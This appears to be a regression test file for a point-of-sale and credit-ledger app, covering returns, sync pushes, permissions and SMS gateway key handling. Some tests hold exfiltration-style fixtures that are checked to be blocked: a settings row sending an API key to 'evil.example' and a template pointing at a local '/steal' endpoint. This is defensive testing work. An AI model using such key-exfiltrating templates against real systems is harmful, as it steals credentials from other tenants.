// Regression tests for bugs found in the core review: returns, double sends, stock checks, device activation, sync
// pushes of settings rows, promises kept by counter payments, sale visibility, the bill discount split, the desktop
// schema upgrade and pulled rows that meet a local change still waiting to be pushed.
const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const { setup, call } = require('./helpers');
const dates = require('../src/lib/dates');
const Calc = require('../public/js/shared/calc');

test('returns: the same sale line sent twice is not refunded twice; refunds add up to the sale', async () => {
    const h = await setup();
    const soap = (await h.post('/api/inventory/products', { name: 'Soap', retailPrice: 10000, cost: 7000, openingStock: 10 })).data.id;
    const s = (await h.post('/api/pos/sales', { items: [{ productId: soap, qty: 3 }], discountType: 'AMOUNT', discountValue: 100, payments: [{ method: 'CASH', amount: 30000 }] })).data;
    const it = s.items[0];
    const dup = await h.post('/api/pos/returns', { saleId: s.id, refundMethod: 'CASH', items: [{ saleItemId: it.id, qty: 3 }, { saleItemId: it.id, qty: 3 }] });
    assert.equal(dup.status, 400, JSON.stringify(dup.data));
    assert.equal((await h.get('/api/inventory/products/' + soap)).data.stock, 7, 'nothing restocked by the refused return');
    // two lines of 1 in one request, then the last 1: exactly the sale total, stock fully back
    const a = await h.post('/api/pos/returns', { saleId: s.id, refundMethod: 'CASH', items: [{ saleItemId: it.id, qty: 1 }, { saleItemId: it.id, qty: 1 }] });
    assert.equal(a.status, 200, JSON.stringify(a.data));
    const b = await h.post('/api/pos/returns', { saleId: s.id, refundMethod: 'CASH', items: [{ saleItemId: it.id, qty: 1 }] });
    assert.equal(b.status, 200, JSON.stringify(b.data));
    assert.equal(a.data.total + b.data.total, s.total);
    const after = (await h.get('/api/pos/sales/' + s.id)).data;
    assert.equal(after.status, 'REFUNDED');
    assert.equal(after.returnedTotal, s.total);
    assert.equal((await h.get('/api/inventory/products/' + soap)).data.stock, 10);
    const more = await h.post('/api/pos/returns', { saleId: s.id, refundMethod: 'CASH', items: [{ saleItemId: it.id, qty: 1 }] });
    assert.equal(more.status, 400);
});

test('sales: the same cart sent several times at once makes one sale; stock check counts every line of a product', async () => {
    const h = await setup();
    const soap = (await h.post('/api/inventory/products', { name: 'Soap', retailPrice: 10000, cost: 7000, openingStock: 5 })).data.id;
    const body = { clientId: crypto.randomUUID(), items: [{ productId: soap, qty: 1 }], payments: [{ method: 'CASH', amount: 10000 }] };
    const rs = await Promise.all([1, 2, 3, 4].map(() => h.post('/api/pos/sales', body)));
    assert.deepEqual(rs.map(r => r.status), [200, 200, 200, 200], JSON.stringify(rs.map(r => r.data.error)));
    assert.equal(new Set(rs.map(r => r.data.id)).size, 1);
    assert.equal(rs.filter(r => r.data.duplicate).length, 3);
    assert.equal((await h.get('/api/inventory/products/' + soap)).data.stock, 4);

    await h.put('/api/settings/pos', { allowNegativeStock: false });
    const two = await h.post('/api/pos/sales', { items: [{ productId: soap, qty: 3 }, { productId: soap, qty: 3 }], payments: [{ method: 'CASH', amount: 60000 }] });
    assert.equal(two.status, 400, 'two lines of 3 when 4 are left');
    assert.match(two.data.error, /Not enough stock/);
    const ok = await h.post('/api/pos/sales', { items: [{ productId: soap, qty: 2 }, { productId: soap, qty: 2 }], payments: [{ method: 'CASH', amount: 40000 }] });
    assert.equal(ok.status, 200, JSON.stringify(ok.data));
});

test('sales: a cashier cannot open another person\'s sale by number', async () => {
    const h = await setup();
    const soap = (await h.post('/api/inventory/products', { name: 'Soap', retailPrice: 10000, cost: 7000, openingStock: 5 })).data.id;
    const s = (await h.post('/api/pos/sales', { items: [{ productId: soap, qty: 1 }], payments: [{ method: 'CASH', amount: 10000 }] })).data;
    const cashier = await h.user('CASHIER');
    assert.equal((await h.get('/api/pos/sales/lookup?code=' + s.number, cashier)).status, 403);
    const returner = await h.user('CASHIER', ['sales.create', 'sales.delete']);
    assert.equal((await h.get('/api/pos/sales/lookup?code=' + s.number, returner)).status, 200, 'returns staff look sales up');
    assert.equal((await h.get('/api/pos/sales/' + s.id, returner)).status, 200, 'and reopen them after a return');
});

test('khata: money paid at the counter for new goods does not mark a promise kept', async () => {
    const h = await setup();
    const soap = (await h.post('/api/inventory/products', { name: 'Soap', retailPrice: 10000, cost: 7000, openingStock: 500 })).data.id;
    const cust = (await h.post('/api/pos/customers', { name: 'Cust' })).data;
    await h.post('/api/pos/sales', { mode: 'CREDIT', customerId: cust.id, items: [{ productId: soap, qty: 50 }], payments: [] });
    const today = dates.ymd(new Date(), 'Asia/Karachi');
    await h.post('/api/khata/promises', { partyId: cust.id, amount: 300000, promisedDate: today });
    await new Promise(r => setTimeout(r, 20));
    const s = await h.post('/api/pos/sales', { mode: 'CREDIT', customerId: cust.id, items: [{ productId: soap, qty: 30 }], payments: [{ method: 'CASH', amount: 300000 }] });
    assert.equal(s.status, 200, JSON.stringify(s.data));
    const c = (await h.get('/api/khata/customers/' + cust.id)).data;
    assert.equal(c.balance, 500000);
    assert.equal(c.promises[0].status, 'PENDING', 'the old debt is untouched');
    assert.equal((await h.get('/api/khata/promises?view=today')).data.rows[0].paid, 0);
    await h.post('/api/khata/receive', { partyId: cust.id, amount: 300000 });
    assert.equal((await h.get('/api/khata/promises?view=kept')).data.rows.length, 1, 'a khata payment keeps it');
});

test('sync push: a PC cannot create another client\'s settings row; activation has the sign-in lock-out', async () => {
    const A = await setup(), B = await setup();
    const act = await call('POST', '/api/device/activate', { email: A.email, password: 'Owner@12345', name: 'x' });
    assert.equal(act.status, 200, JSON.stringify(act.data));
    const push = rows => fetch(A.base + '/api/sync/push', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Device-Token': act.data.deviceToken }, body: JSON.stringify({ rows }) }).then(r => r.json());
    const now = new Date().toISOString();
    const evil = { id: `${B.tenantId}:messaging`, tenantId: A.tenantId, key: 'messaging', value: JSON.stringify({ provider: 'HTTP', urlTemplate: 'https://evil.example/?k={apikey}' }), createdAt: now, updatedAt: now };
    const r = await push([{ tbl: 'Setting', row: evil }, { tbl: 'Setting', row: { ...evil, id: `${A.tenantId}:receipt`, key: 'receipt', value: JSON.stringify({ copies: 2 }) } }]);
    assert.equal(r.rejected.length, 1, JSON.stringify(r));
    assert.notEqual((await B.get('/api/khata/messaging')).data.urlTemplate, 'https://evil.example/?k={apikey}');
    assert.equal((await A.get('/api/settings')).data.receipt.copies, 2, 'its own settings row still syncs');
    // an AuditLog row pushed twice (a retry after a lost answer) is fine; a changed one is ignored, not a failed push
    const log = { id: crypto.randomUUID(), tenantId: A.tenantId, action: 'x', summary: 'from the PC', createdAt: now, updatedAt: now };
    assert.equal((await push([{ tbl: 'AuditLog', row: log }])).created, 1);
    const again = await push([{ tbl: 'AuditLog', row: { ...log, summary: 'changed', updatedAt: new Date(Date.now() + 60000).toISOString() } }]);
    assert.equal(again.skipped, 1, JSON.stringify(again));

    for (let i = 0; i < 5; i++) assert.equal((await call('POST', '/api/device/activate', { email: B.email, password: 'wrong-password' })).status, 401);
    const locked = await call('POST', '/api/device/activate', { email: B.email, password: 'Owner@12345' });
    assert.equal(locked.status, 401);
    assert.match(locked.data.error, /Too many wrong passwords/);
});

test('bill discount: shares add up exactly and no line gets a negative share', () => {
    const lines = Array.from({ length: 10 }, () => ({ qty: 1, price: 150 })).concat([{ qty: 1, price: 10 }]);
    const b = Calc.bill(lines, { discountType: 'PERCENT', discountValue: 5 });
    assert.equal(b.lines.reduce((s, l) => s + l.discount, 0), b.discount);
    assert.ok(b.lines.every(l => l.discount >= 0 && l.net >= 0 && l.discount <= l.gross), JSON.stringify(b.lines));
    for (let k = 0; k < 3000; k++) {
        const ls = Array.from({ length: 1 + (k % 7) }, (_, i) => ({ qty: 1 + ((k + i) % 4), price: (k * 37 + i * 101) % 500, lineDiscount: i === 1 ? (k % 50) : 0 }));
        const r = Calc.bill(ls, { discountType: 'PERCENT', discountValue: (k * 7.3) % 100 });
        assert.equal(r.lines.reduce((s, l) => s + l.discount, 0), r.discount);
        assert.ok(r.lines.every(l => l.net >= 0));
    }
});

// runs code in a desktop-mode child process (SQLite) and returns its stdout
function desktopRun(code) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hp-review-'));
    const r = spawnSync(process.execPath, ['-e', code], {
        cwd: path.join(__dirname, '..'), encoding: 'utf8', timeout: 60000,
        env: { ...process.env, MODE: 'desktop', DATABASE_URL: `file:${path.join(dir, 'pc.db')}?connection_limit=1`, JWT_SECRET: 'review-core-secret-'.padEnd(48, 'z') },
    });
    assert.equal(r.status, 0, r.stdout + r.stderr);
    return r.stdout;
}

test('desktop schema upgrade: new columns (indexed, dated) are added before indexes are made', () => {
    const out = desktopRun(`
        const { prisma } = require('./src/db');
        const client = require('./src/sync/client');
        (async () => {
            await client.ensureSchema();
            await prisma.auditLog.create({ data: { action: 'a', summary: 's' } });
            await prisma.tenant.create({ data: { name: 'T' } });
            // the database of an older app version: these columns (and the index on one) did not exist yet
            await prisma.$executeRawUnsafe('DROP INDEX "AuditLog_tenantId_createdAt_idx"');
            await prisma.$executeRawUnsafe('ALTER TABLE "AuditLog" DROP COLUMN "createdAt"');
            await prisma.$executeRawUnsafe('ALTER TABLE "Tenant" DROP COLUMN "integratedAt"');
            await prisma.$executeRawUnsafe('ALTER TABLE "Category" DROP COLUMN "imageUrl"');
            await prisma.$executeRawUnsafe("UPDATE \\"_device\\" SET \\"v\\" = 'old' WHERE \\"k\\" = 'schemaVersion'");
            await client.ensureSchema();
            const a = await prisma.auditLog.findMany({ select: { createdAt: true } });
            const t = await prisma.tenant.findMany({ select: { integratedAt: true } });
            const idx = await prisma.$queryRawUnsafe("SELECT name FROM sqlite_master WHERE name = 'AuditLog_tenantId_createdAt_idx'");
            console.log(JSON.stringify({ a: a.length, dated: a[0].createdAt instanceof Date && t[0].integratedAt instanceof Date, idx: idx.length }));
            process.exit(0);
        })().catch(e => { console.error(e); process.exit(1); });`);
    assert.deepEqual(JSON.parse(out.trim().split('\n').pop()), { a: 1, dated: true, idx: 1 });
});

test('desktop pull: a cloud row newer than a local change still waiting replaces it; an older one does not', () => {
    const out = desktopRun(`
        const { prisma } = require('./src/db');
        const client = require('./src/sync/client');
        const state = require('./src/sync/state');
        (async () => {
            await client.ensureSchema();
            const tid = 't-1';
            const p1 = await prisma.product.create({ data: { tenantId: tid, name: 'Soap', retailPrice: 100n } });
            const p2 = await prisma.product.create({ data: { tenantId: tid, name: 'Tea', retailPrice: 100n } });
            await prisma.$executeRawUnsafe('DELETE FROM "_outbox"');
            const row = (p, name, ms) => ({ ...p, name, retailPrice: 555, updatedAt: new Date(Date.now() + ms).toISOString() });
            let pulled = false;
            // a fake cloud. Just before the pull is applied the cashier changes both products (local changes waiting to
            // go up); the pull brings Soap changed later in the cloud (newer) and Tea changed earlier (older).
            global.fetch = async (url, opts) => {
                if (opts.method === 'POST') return { ok: true, status: 200, json: async () => ({}) };
                const rows = [];
                if (!pulled) {
                    pulled = true;
                    await prisma.product.update({ where: { id: p1.id }, data: { name: 'Soap (PC)' } });
                    await prisma.product.update({ where: { id: p2.id }, data: { name: 'Tea (PC)' } });
                    rows.push({ tbl: 'Product', row: row(p1, 'Soap (cloud)', 60000) }, { tbl: 'Product', row: row(p2, 'Tea (cloud)', -60000) });
                }
                return { ok: true, status: 200, json: async () => ({ rows, cursor: 5, more: false, access: {}, mode: 'FULL' }) };
            };
            state.set({ device: { id: 'd', code: 'D1', tenantId: tid }, serverUrl: 'http://cloud.invalid', token: 'x', cursor: 0, revoked: false });
            const r = await client.syncOnce();
            const a = await prisma.product.findUnique({ where: { id: p1.id } });
            const b = await prisma.product.findUnique({ where: { id: p2.id } });
            const waiting = await prisma.$queryRawUnsafe('SELECT "rowId" FROM "_outbox"');
            console.log(JSON.stringify({ r, soap: a.name, tea: b.name, waiting: waiting.map(w => w.rowId === p1.id ? 'soap' : 'tea') }));
            process.exit(0);
        })().catch(e => { console.error(e); process.exit(1); });`);
    const res = JSON.parse(out.trim().split('\n').pop());
    assert.equal(res.r.error, undefined, JSON.stringify(res));
    assert.equal(res.soap, 'Soap (cloud)', 'the newer cloud row wins over the waiting older local change');
    assert.equal(res.tea, 'Tea (PC)', 'the newer local change stays and goes up next');
    assert.deepEqual([...new Set(res.waiting)], ['tea']);
});

test('SMS gateway key: it only goes to the address it was saved for, and an echoed key is hidden', async () => {
    const http = require('http');
    const hits = [];
    const gateway = reply => new Promise(r => { const s = http.createServer((req, res) => { hits.push({ port: s.address().port, url: req.url }); res.writeHead(reply.status); res.end(reply.body(req.url)); }).listen(0, '127.0.0.1', () => r(s)); });
    const good = await gateway({ status: 200, body: () => 'OK' });
    const echo = await gateway({ status: 400, body: u => 'bad request ' + decodeURIComponent(u) });
    const thief = await gateway({ status: 200, body: () => 'OK' });
    try {
        const h = await setup();
        const put = await h.put('/api/khata/messaging', { smsEnabled: true, provider: 'HTTP', urlTemplate: `http://127.0.0.1:${good.address().port}/send?k={apikey}&to={to}&m={message}`, apiKey: 'KEY-12345' });
        assert.equal(put.status, 200, JSON.stringify(put.data));
        const ok = await h.post('/api/khata/messaging/test', { to: '03001234567' });
        assert.equal(ok.data.status, 'SENT', JSON.stringify(ok.data));
        assert.match(hits.find(x => x.port === good.address().port).url, /k=KEY-12345/);
        // someone with settings access points the template at their own server, without knowing the key
        await h.put('/api/khata/messaging', { urlTemplate: `http://127.0.0.1:${thief.address().port}/steal?k={apikey}&to={to}` });
        const stolen = await h.post('/api/khata/messaging/test', { to: '03001234567' });
        assert.equal(stolen.data.status, 'FAILED');
        assert.match(stolen.data.error, /Enter the API key again/);
        assert.equal(hits.filter(x => x.port === thief.address().port).length, 0, 'the key never reached the other address');
        // the owner types the key again for a gateway that echoes requests in its errors: the key is not logged
        await h.put('/api/khata/messaging', { urlTemplate: `http://127.0.0.1:${echo.address().port}/send?k={apikey}&to={to}`, apiKey: 'KEY-12345' });
        const bad = await h.post('/api/khata/messaging/test', { to: '03001234567' });
        assert.equal(bad.data.status, 'FAILED');
        assert.ok(!JSON.stringify(bad.data).includes('KEY-12345'), JSON.stringify(bad.data));
        const logs = (await h.get('/api/khata/messages')).data;
        assert.ok(!JSON.stringify(logs).includes('KEY-12345'));
    } finally { good.close(); echo.close(); thief.close(); }
});

test('sync push: a PC cannot hang lines under another client\'s sale; sales only show their own client\'s lines', async () => {
    const A = await setup(), B = await setup();
    const soapB = (await B.post('/api/inventory/products', { name: 'Soap', retailPrice: 10000, cost: 7000, openingStock: 5 })).data.id;
    const saleB = (await B.post('/api/pos/sales', { items: [{ productId: soapB, qty: 1 }], payments: [{ method: 'CASH', amount: 10000 }] })).data;
    const act = await call('POST', '/api/device/activate', { email: A.email, password: 'Owner@12345', name: 'x' });
    const push = rows => fetch(A.base + '/api/sync/push', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Device-Token': act.data.deviceToken }, body: JSON.stringify({ rows }) }).then(r => r.json());
    const now = new Date().toISOString();
    const item = { id: crypto.randomUUID(), saleId: saleB.id, productId: soapB, name: 'Injected', qty: 1, baseQty: 1, price: 1, gross: 1, total: 1, createdAt: now, updatedAt: now };
    const pay = { id: crypto.randomUUID(), saleId: saleB.id, method: 'CASH', amount: 1, createdAt: now, updatedAt: now };
    const r = await push([{ tbl: 'SaleItem', row: item }, { tbl: 'SalePayment', row: pay }]);
    assert.equal(r.rejected.length, 2, JSON.stringify(r));
    const seen = (await B.get('/api/pos/sales/' + saleB.id)).data;
    assert.equal(seen.items.length, 1);
    assert.equal(seen.payments.length, 1);
    // a PC's own new sale with its lines in one push is accepted (the parent comes first in the batch)
    const sid = crypto.randomUUID();
    const sale = { id: sid, number: 'INV-D1-0001', date: now, customerName: 'Walk-in Customer', createdAt: now, updatedAt: now };
    const ok = await push([{ tbl: 'Sale', row: sale }, { tbl: 'SaleItem', row: { ...item, id: crypto.randomUUID(), saleId: sid, name: 'Soap' } }]);
    assert.equal(ok.rejected.length, 0, JSON.stringify(ok));
    assert.equal(ok.created, 2);
});

test('a new cashier gets sales only (not customers\' balances and limits); the POS customer search still works', async () => {
    const h = await setup();
    const cashier = await h.user('CASHIER');
    assert.equal((await h.get('/api/pos/customers', cashier)).status, 200);
    const c = await h.post('/api/pos/customers', { name: 'Walk-in Ali' }, cashier);
    assert.equal(c.status, 200);
    assert.equal((await h.put('/api/parties/' + c.data.id, { name: 'Walk-in Ali', creditLimit: 99999900, openingBalance: 500000 }, cashier)).status, 403);
});
